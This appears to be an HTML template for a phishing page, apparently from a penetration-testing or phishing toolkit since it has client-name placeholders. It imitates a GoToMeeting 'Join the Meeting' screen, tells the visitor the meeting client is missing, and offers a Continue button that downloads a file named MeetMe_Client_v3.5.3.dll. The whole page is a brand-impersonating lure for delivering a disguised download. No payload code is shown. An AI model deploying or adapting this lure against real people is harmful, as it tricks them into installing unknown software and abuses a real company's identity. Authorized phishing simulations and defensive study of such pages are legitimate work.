<html lang="en-US">

<head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <meta http-equiv="content-language" content="en-US">
    <link rel="Shortcut Icon" href="/fec/images/MeetMe_favicon.ico">
    <title>Join the Meeting | GoToMeeting</title>
    <link rel="stylesheet" href="./include/style.css" type="text/css">
</head>

<body>
    <header>
        <a href="login.html" class="login">Login</a>
        <div class="logo">
            <img src="./images/logo.png" height="50px">
        </div>
        <div class="tagline">
            Making Meetings Easier... One Step at a Time
        </div>
    </header>
    <div class="container">
        <div class="download_area" style="margin-top:200px;">
            <form action="./MeetMe_Client_v3.5.3.dll" method="GET">
                <table class="download_table">
                    <tr>
                        <td>
                            <p class="download_text">It appears you don't have our client installed. Please click below to install the client.</p>
                        </td>
                    </tr>
                    <tr>
                        <td style="text-align:center;">
                            <input type="submit" class="button" value="Continue" style="background-color:#21252a; color:#FFF;">
                        </td>
                    </tr>
                </table>
            </form>
        </div>
        <footer>
            <hr>
            <span class="copyright">Copyright &copy; {{ time.local|strftime('%Y') }} {{ client.company_name }}, All rights reserved.</span>
            </footer>
</body>
</html>
